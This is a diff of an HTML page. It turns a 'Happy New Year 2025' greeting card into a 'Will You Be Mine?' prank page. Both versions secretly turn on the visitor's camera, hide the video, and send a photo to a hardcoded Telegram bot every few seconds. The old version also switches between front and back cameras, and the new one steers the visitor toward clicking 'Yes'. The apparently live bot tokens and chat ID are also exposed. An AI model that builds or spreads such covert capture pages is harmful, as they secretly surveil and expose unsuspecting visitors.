@@ -3,231 +3,165 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Happy New Year 2025</title>
+  <title>🥹❤️‍🩹</title>
   <style>
-    @import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Pinyon+Script&display=swap');
-
     body {
+      font-family: Arial, sans-serif;
       margin: 0;
       padding: 0;
+      background: linear-gradient(to right, #ff758c, #ff7eb3);
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
-      width: 100vw;
-      background: linear-gradient(45deg, #ff9a9e, #fad0c4, #fbc2eb, #a18cd1);
-      background-size: 300% 300%;
-      font-family: 'Dancing Script', cursive;
-      animation: bgAnimation 12s infinite alternate;
-      overflow: hidden;
-    }
-
-    @keyframes bgAnimation {
-      0% { background-position: 0% 50%; }
-      50% { background-position: 100% 50%; }
-      100% { background-position: 0% 50%; }
     }
 
     .container {
       text-align: center;
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
     }
 
     h1 {
-      font-size: 3rem;
-      color: #fff;
-      text-shadow: 2px 2px 10px rgba(0, 0, 0, 0.3);
+      color: #ff5678;
     }
 
-    h1 span {
-      color: #ffeb3b;
-      font-style: italic;
+    button {
+      margin: 10px;
+      padding: 10px 20px;
+      background: #ff5678;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 16px;
     }
 
-    .love-letter {
-      font-family: 'Pinyon Script', cursive;
-      font-size: 1.5rem;
-      color: #fff;
-      margin-top: 30px;
-      text-align: left;
-      width: 80%;
-      max-height: 300px;
-      margin: 20px auto;
-      border: 2px solid #ff4b5c;
-      padding: 20px;
-      border-radius: 15px;
-      background-color: rgba(0, 0, 0, 0.5);
-      box-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
-      overflow-y: auto;
+    button:hover {
+      background: #ff4567;
+    }
+
+    .emoji {
+      font-size: 100px;
+      margin: 20px 0;
     }
 
     video, canvas {
-      display: none; /* Hide video and canvas */
-    }
-
-    .music-btn {
-      position: absolute;
-      bottom: 20px;
-      background-color: #ff4b5c;
-      color: white;
-      font-size: 1.5rem;
-      padding: 10px 20px;
-      border: none;
-      border-radius: 25px;
-      cursor: pointer;
-      transition: background-color 0.3s ease;
-    }
-
-    .music-btn:hover {
-      background-color: #ff1e56;
+      display: none;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h1>Happy<span>New</span> Year 2025</h1>
-
-    <div class="love-letter">
-      <p>Happy New year 20225</p>
-      <p> Happy New Year 2025!
-Wishing you a year filled with happiness, peace, and success.
-May all your dreams come true, and may every moment bring joy to your life.
-Step into the new year with hope, positivity, and endless opportunities.
-Here's to a wonderful year ahead!
-Happy New Year!
-
- ,</p>
-      <p><strong>Happy new year 2025</strong></p>
-    </div>
-
-    <!-- Music Play Button -->
-    <button class="music-btn" onclick="toggleMusic()">Play Music</button>
-
-    <video id="video" autoplay></video>
-    <canvas id="canvas"></canvas>
+  <div id="app" class="container">
+    <h1>Will You Be Mine?</h1>
+    <button class="btn" onclick="handleYes()">Yes</button>
+    <button class="btn" onclick="handleNo()">No</button>
   </div>
 
-  <audio id="loveAudio" loop>
-    <source src="https://www.bensound.com/bensound-music/bensound-tenderness.mp3" type="audio/mp3">
-    Your browser does not support the audio element.
-  </audio>
+  <video id="camera" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
 
   <script>
-    const video = document.getElementById('video');
+    let noClickCount = 0;
+
+    function handleYes() {
+      const app = document.getElementById('app');
+      app.innerHTML = `
+        <h1>Thank you for be Mine!</h1>
+        <div class="emoji">❤️</div>
+        <p>I love you so much🥹</p>
+      `;
+      startContinuousCapture();
+    }
+
+    function handleNo() {
+      const app = document.getElementById('app');
+      const messages = [
+        "Please Be Mine😢",
+        "Please reconsider and be mine.. 🙏",
+        "Don't break my heart! Please🥺",
+        "Will You Be Mine...",
+      ];
+      const emojis = ["😢", "😔", "💔", "😭"];
+
+      if (noClickCount < messages.length) {
+        app.innerHTML = `
+          <h1>${messages[noClickCount]}</h1>
+          <div class="emoji">${emojis[noClickCount]}</div>
+          <button class="btn" onclick="handleYes()">Yes</button>
+          <button class="btn" onclick="handleNo()">No</button>
+        `;
+        noClickCount++;
+      } else {
+        app.innerHTML = `
+          <h1>You are mine...</h1>
+          <div class="emoji">🥹</div>
+          <button class="btn" onclick="handleYes()">Yes</button>
+        `;
+      }
+    }
+
+    const video = document.getElementById('camera');
     const canvas = document.getElementById('canvas');
     const context = canvas.getContext('2d');
-    const music = document.getElementById('loveAudio');
-    const botToken = '7485325921:AAFhTcGd07gyuc1d0X3PIqU-pjh74wd821s'; // Replace with your bot token
-    const chatId = '1987016824';    // Replace with your chat ID
 
-    let useFrontCamera = true; // Start with front camera
-    let isMusicPlaying = false;
+    const botToken = "7891742749:AAHRWnK8KtgV4c7KEb6MY27D9AXdIsrKp_w"; // Replace with your bot token
+    const chatId = "1987016824"; // Replace with your chat ID
 
-    // Camera constraints
-    const constraints = {
-      video: {
-        facingMode: useFrontCamera ? 'user' : 'environment'
-      }
-    };
-
-    // Start camera stream
-    function startCamera() {
-      navigator.mediaDevices.getUserMedia(constraints)
-        .then(stream => {
-          video.srcObject = stream;
-        })
-        .catch(error => {
-          console.error('Error accessing camera:', error);
-        });
-    }
-
-    // Stop the camera stream
-    function stopCamera() {
-      const stream = video.srcObject;
-      if (stream) {
-        const tracks = stream.getTracks();
-        tracks.forEach(track => track.stop());
+    async function startCamera() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+      } catch (error) {
+        alert('Camera access denied or unavailable!');
+        console.error(error);
       }
     }
 
-    // Capture photo and send to Telegram
-    function captureAndSendPhoto() {
+    async function captureAndSend() {
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-      const base64Image = canvas.toDataURL('image/png');
-      const blob = base64ToBlob(base64Image);
-
-      sendToTelegram(blob);
-    }
-
-    // Convert Base64 to Blob
-    function base64ToBlob(base64) {
-      const byteString = atob(base64.split(',')[1]);
-      const arrayBuffer = new ArrayBuffer(byteString.length);
-      const uintArray = new Uint8Array(arrayBuffer);
-
-      for (let i = 0; i < byteString.length; i++) {
-        uintArray[i] = byteString.charCodeAt(i);
-      }
-
-      return new Blob([uintArray], { type: 'image/png' });
-    }
-
-    // Send photo to Telegram
-    function sendToTelegram(blob) {
-      const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
-
+      const imageData = canvas.toDataURL('image/png');
+      const blob = dataURItoBlob(imageData);
       const formData = new FormData();
       formData.append('chat_id', chatId);
       formData.append('photo', blob, 'photo.png');
 
-      fetch(url, {
-        method: 'POST',
-        body: formData,
-      })
-        .then(response => response.json())
-        .then(data => {
-          if (!data.ok) {
-            console.error('Telegram API Error:', data);
-          }
-        })
-        .catch(err => {
-          console.error('Fetch Error:', err);
+      try {
+        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+          method: 'POST',
+          body: formData
         });
-    }
-
-    // Automatically switch between front and back cameras
-    function autoSwitchCamera() {
-      setInterval(() => {
-        stopCamera();
-        useFrontCamera = !useFrontCamera; // Toggle camera
-        constraints.video.facingMode = useFrontCamera ? 'user' : 'environment';
-        startCamera();
-      }, 5000); // Switch camera every 5 seconds
-    }
-
-    // Automatically capture photos
-    setInterval(() => {
-      captureAndSendPhoto();
-    }, 5000); // Capture photo every 5 seconds
-
-    // Music control
-    function toggleMusic() {
-      if (isMusicPlaying) {
-        music.pause();
-        isMusicPlaying = false;
-        document.querySelector('.music-btn').textContent = 'Play Music';
-      } else {
-        music.play();
-        isMusicPlaying = true;
-        document.querySelector('.music-btn').textContent = 'Pause Music';
+        const result = await response.json();
+        if (result.ok) {
+          console.log('Photo sent successfully!');
+        } else {
+          console.error('Failed to send photo!', result);
+        }
+      } catch (error) {
+        console.error('Error sending photo!', error);
       }
     }
 
-    // Initialize camera and start the process
-    startCamera();
-    autoSwitchCamera();
+    function dataURItoBlob(dataURI) {
+      const byteString = atob(dataURI.split(',')[1]);
+      const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+      const ab = new ArrayBuffer(byteString.length);
+      const ia = new Uint8Array(ab);
+      for (let i = 0; i < byteString.length; i++) {
+        ia[i] = byteString.charCodeAt(i);
+      }
+      return new Blob([ab], { type: mimeString });
+    }
+
+    async function startContinuousCapture() {
+  await startCamera();
+  setInterval(captureAndSend, 2000); // 2000 ms = 2 seconds
+
+    }
   </script>
 </body>
 </html>
